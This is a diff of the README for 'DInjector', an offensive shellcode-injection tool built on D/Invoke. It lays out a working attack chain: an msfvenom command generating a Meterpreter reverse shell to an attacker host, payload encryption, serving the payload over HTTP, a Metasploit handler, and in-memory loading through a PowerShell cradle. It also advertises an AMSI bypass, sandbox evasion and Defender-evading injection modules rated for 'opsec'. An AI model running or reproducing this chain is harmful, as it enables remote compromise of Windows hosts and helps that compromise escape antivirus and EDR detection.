@@ -20,55 +20,64 @@ DInjector
 
 This repository is an accumulation of my code snippets for various **shellcode injection** techniques using fantastic [D/Invoke](https://thewover.github.io/Dynamic-Invoke/) API by @TheWover and @FuzzySecurity.
 
-DInjector is not intended to be used for AV/EDR evasion out-of-the-box, but provides a bunch of weaponized examples to improve your generic tradecraft during the engagement and/or sharpen your detection rules to prevent this sort of shellcode execution.
+Features:
 
-Some tips how the driver [Program](/DInjector/Program.cs) can be enhanced (leaving it as an exercise for the reader):
+* Fully ported to D/Invoke API.
+* Encrypted payloads which can be invoked from a URL or passed in Base64 as an argument.
+* Built-in AMSI bypass based on @rasta-mouse [method](https://rastamouse.me/memory-patching-amsi-bypass/).
+* Sandbox detection & evasion.
 
-* Use encrypted payloads which can be invoked from a URL or passed in Base64 as an argument.
-* Add built-in AMSI bypass (a great example from @rasta-mouse is [here](https://rastamouse.me/memory-patching-amsi-bypass/)).
-* Add sandbox detection methods.
-* Protect the resulting assembly with [ConfuserEx](https://github.com/yck1509/ConfuserEx) or similar tools.
-
-**Note:** based on my testings the DInvoke NuGet [package](https://www.nuget.org/packages/DInvoke/) itself is being flagged by many commercial AV/EDR solutions when incuded as an embedded resource via [Costura.Fody](https://www.nuget.org/packages/Costura.Fody/) (or similar approaches), so I recommend to modify it and include from [source](https://github.com/TheWover/DInvoke) to achieve better opsec.
+:information_source: Based on my testings the DInvoke NuGet [package](https://www.nuget.org/packages/DInvoke/) itself is being flagged by many commercial AV/EDR solutions when incuded as an embedded resource via [Costura.Fody](https://www.nuget.org/packages/Costura.Fody/) (or similar approaches), so I've shrinked it a bit and included from [source](https://github.com/TheWover/DInvoke) to achieve better opsec.
 
 ## Usage
-
-Here is a basic example to get started.
 
 1. Compile the project in Visual Studio.
 2. Generate a shellcode for your favourite C2:
 
 ```console
-~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
+~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=10.10.13.37 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
 ```
 
-3. Serve `shellcode.bin` and start C2 listener:
+3. Encrypt the shellcode:
+
+```console
+~$ Crypto/encrypt.py shellcode.bin -p 'Passw0rd!' -o enc
+```
+
+4. Serve the encrypted shellcode and prepare C2 listener:
 
 ```console
 ~$ sudo python3 -m http.server 80
-~$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost 10.10.13.37; set lport 443; set EXITFUNC thread; run"
+~$ sudo msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost 10.10.13.37; set lport 443; set EXITFUNC thread; run"
 ```
 
-4. Use one of the PowerShell download [cradles](/Cradles) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.
+5. Use the PowerShell download [cradle](/cradle.ps1) to load DInjector.dll as `System.Reflection.Assembly` and execute it from memory.
 
-I **do not** recommend putting the assembly on disk because it will very likely be flagged.
+:warning: I **do not** recommend putting the assembly on disk because it will very likely be flagged.
+
+Global required arguments:
+
+| Key         | Value                    | Description                                                        |
+|-------------|--------------------------|--------------------------------------------------------------------|
+| `/am51`     | `true`, `false`          | Applies AMSI bypass                                                |
+| `/sc`       | `http://10.10.13.37/enc` | Sets shellcode path (can be loaded from URL or as a Base64 string) |
+| `/password` | `Passw0rd!`              | Sets password to decrypt the shellcode                             |
 
 ## Modules
 
-**Note:** opsec safe considerations are based on my personal expirience and some testings along the way.
+:warning: opsec safe considerations are based on my personal expirience and some testings along the way.
 
 ### [FunctionPointer](/DInjector/Modules/FunctionPointer.cs)
 
 ```yaml
 module_name: 'functionpointer'
-arguments: |
-  /sc:http://10.10.13.37/shellcode.bin
 description: |
   Allocates a RWX memory region, copies the shellcode into it
   and executes it like a function.
 calls:
   - ntdll.dll:
-    1: 'NtAllocateVirtualMemory'
+    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
+    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
 references:
   - 'http://disbauxes.upc.es/code/two-basic-ways-to-run-and-test-shellcode/'
@@ -80,13 +89,11 @@ references:
 
 ```yaml
 module_name: 'functionpointerv2'
-arguments: |
-  /sc:http://10.10.13.37/shellcode.bin
 description: |
   Sets RWX on a byte array and executes it like a function.
 calls:
   - ntdll.dll:
-    1: 'NtProtectVirtualMemory'
+    1: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
 opsec_safe: false
 references:
   - 'https://jhalon.github.io/utilizing-syscalls-in-csharp-1/'
@@ -98,15 +105,13 @@ references:
 
 ```yaml
 module_name: 'currentthread'
-arguments: |
-  /sc:http://10.10.13.37/shellcode.bin
 description: |
   Injects shellcode into current process.
   Thread execution via NtCreateThreadEx.
 calls:
   - ntdll.dll:
-    1: 'NtAllocateVirtualMemory'
-    2: 'NtProtectVirtualMemory'
+    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
+    2: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     3: 'NtCreateThreadEx'
     4: 'NtWaitForSingleObject'
 opsec_safe: false
@@ -119,20 +124,45 @@ references:
 ```yaml
 module_name: 'remotethread'
 arguments: |
-  /sc:http://10.10.13.37/shellcode.bin /pid:1337
+  /pid:1337
 description: |
   Injects shellcode into an existing remote process.
   Thread execution via NtCreateThreadEx.
 calls:
   - ntdll.dll:
     1: 'NtOpenProcess'
-    2: 'NtAllocateVirtualMemory'
+    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     3: 'NtWriteVirtualMemory'
-    4: 'NtProtectVirtualMemory'
+    4: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     5: 'NtCreateThreadEx'
 opsec_safe: false
 references:
   - 'https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/SharpImpersonation/Shellcode.cs'
+```
+
+### [RemoteThreadSuspended](/DInjector/Modules/RemoteThreadSuspended.cs)
+
+```yaml
+module_name: 'remotethreadsuspended'
+arguments: |
+  /pid:1337
+description: |
+  Injects shellcode into an existing remote process and flips memory protection to PAGE_NOACCESS.
+  After a short sleep (waiting until a possible AV scan is finished) the protection is flipped again to PAGE_EXECUTE_READ.
+  Thread execution via NtCreateThreadEx.
+calls:
+  - ntdll.dll:
+    1: 'NtOpenProcess'
+    2: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
+    3: 'NtWriteVirtualMemory'
+    4: 'NtProtectVirtualMemory (PAGE_NOACCESS)'
+    5: 'NtCreateThreadEx (CREATE_SUSPENDED)'
+    6: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
+    7: 'NtResumeThread'
+opsec_safe: true
+references:
+  - 'https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/'
+  - 'https://github.com/plackyhacker/Suspended-Thread-Injection/blob/main/injection.cs'
 ```
 
 ### [RemoteThreadAPC](/DInjector/Modules/RemoteThreadAPC.cs)
@@ -140,7 +170,7 @@ references:
 ```yaml
 module_name: 'remotethreadapc'
 arguments: |
-  /sc:http://10.10.13.37/shellcode.bin /image:C:\Windows\System32\svchost.exe
+  /image:C:\Windows\System32\svchost.exe
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtQueueApcThread.
@@ -148,9 +178,9 @@ calls:
   - kernel32.dll:
     1: 'CreateProcess'
   - ntdll.dll:
-    1: 'NtAllocateVirtualMemory'
+    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory'
-    3: 'NtProtectVirtualMemory'
+    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
     4: 'NtOpenThread'
     5: 'NtQueueApcThread'
     6: 'NtAlertResumeThread'
@@ -165,7 +195,7 @@ references:
 ```yaml
 module_name: 'remotethreadcontext'
 arguments: |
-  /sc:http://10.10.13.37/shellcode.bin /image:C:\Windows\System32\svchost.exe
+  /image:C:\Windows\System32\svchost.exe
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via SetThreadContext.
@@ -173,10 +203,10 @@ calls:
   - kernel32.dll:
     1: 'CreateProcess'
   - ntdll.dll:
-    1: 'NtAllocateVirtualMemory'
+    1: 'NtAllocateVirtualMemory (PAGE_READWRITE)'
     2: 'NtWriteVirtualMemory'
-    3: 'NtProtectVirtualMemory'
-    4: 'NtCreateThreadEx'
+    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READ)'
+    4: 'NtCreateThreadEx (CREATE_SUSPENDED)'
     5: 'GetThreadContext'
     6: 'SetThreadContext'
     7: 'NtResumeThread'
@@ -191,7 +221,7 @@ references:
 ```yaml
 module_name: 'processhollow'
 arguments: |
-  /sc:http://10.10.13.37/shellcode.bin /image:C:\Windows\System32\svchost.exe
+  /image:C:\Windows\System32\svchost.exe
 description: |
   Injects shellcode into a newly spawned remote process.
   Thread execution via NtResumeThread (hollowing with shellcode).
@@ -201,9 +231,10 @@ calls:
   - ntdll.dll:
     1: 'NtQueryInformationProcess'
     2: 'NtReadVirtualMemory'
-    3: 'NtProtectVirtualMemory'
+    3: 'NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)'
     4: 'NtWriteVirtualMemory'
-    5: 'NtResumeThread'
+    5: 'NtProtectVirtualMemory (oldProtect)'
+    6: 'NtResumeThread'
 opsec_safe: false
 references:
   - 'https://github.com/CCob/SharpBlock/blob/master/Program.cs'
